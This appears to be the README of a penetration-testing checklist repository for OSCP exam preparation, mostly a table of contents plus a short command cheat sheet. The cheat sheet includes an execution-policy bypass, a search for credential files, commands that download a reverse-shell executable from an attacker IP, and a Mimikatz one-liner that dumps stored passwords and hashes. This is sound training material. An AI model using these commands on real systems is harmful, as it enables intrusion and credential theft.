# Penetration Testing Checklists and Cheatsheets

This repository contains various checklists and cheatsheets to aid in penetration testing and preparing for the Offensive Security OSCP exam.

## Table of Contents

1. [Commands Cheat Sheet](#commands-cheat-sheet)
2. [General Checklists](#general-checklists)
   - [General Checklist Before Starting](#general-checklist-before-starting)
   - [General Checklist for Web Applications](#general-checklist-for-web-applications)
3. [Detailed Checklists](#detailed-checklists)
   - [Web Application Pre-Authentication Checklist](#web-application-pre-authentication-checklist)
   - [Web Application Directory Enumeration Checklist](#web-application-directory-enumeration-checklist)
   - [Web Application Login Checklist](#web-application-login-checklist)
   - [Finding Vulnerabilities and Exploits Checklist](#finding-vulnerabilities-and-exploits-checklist)
   - [Network Discovery and Port Scan Checklist](#network-discovery-and-port-scan-checklist)
   - [Active Directory General Checklist](#active-directory-general-checklist)
   - [Active Directory with Credentials Checklist](#active-directory-with-credentials-checklist)
   - [Active Directory without Credentials Checklist](#active-directory-without-credentials-checklist)
   - [Active Directory Kerberos Checklist](#active-directory-kerberos-checklist)
   - [Active Directory Lateral and Vertical Movement Checklist](#active-directory-lateral-and-vertical-movement-checklist)
   - [Privilege Escalation Windows Checklist](#privilege-escalation-windows-checklist)
   - [Privilege Escalation Linux Checklist](#privilege-escalation-linux-checklist)
   - [Ligolo-ng Checklist](#ligolo-ng-checklist)

---

## Commands Cheat Sheet

### Full TTY

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/tmp
export TERM=xterm-256color
alias ls='ls -arlht --color=auto'
stty columns 200 rows 200
```

### Windows PowerShell Commands
EXECUTION POLICY
```
Set-ExecutionPolicy Unrestricted -Scope CurrentUser
powershell -ExecutionPolicy Bypass -File .\PowerView.ps1
```
Show file like with Tree
```
Get-ChildItem -Path "./*" -Include "*" -Recurse -ErrorAction SilentlyContinue
```
```
Get-ChildItem -Path "C:\Users\*" -Include "flag.txt", "local.txt", "user.txt", "password.txt", "proof.txt", "credentials.txt" -Recurse -ErrorAction SilentlyContinue
```
Download
```
wget http://192.168.123.100:8000/rev4445.exe -OutFile rev4445.exe
```
```
certutil -split -urlcache -f http://192.168.123.100:8000/agent.exe agent.exe
```
Mimikatz Oneliner
```
.\mimikatz "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "vault::cred" "exit"
```

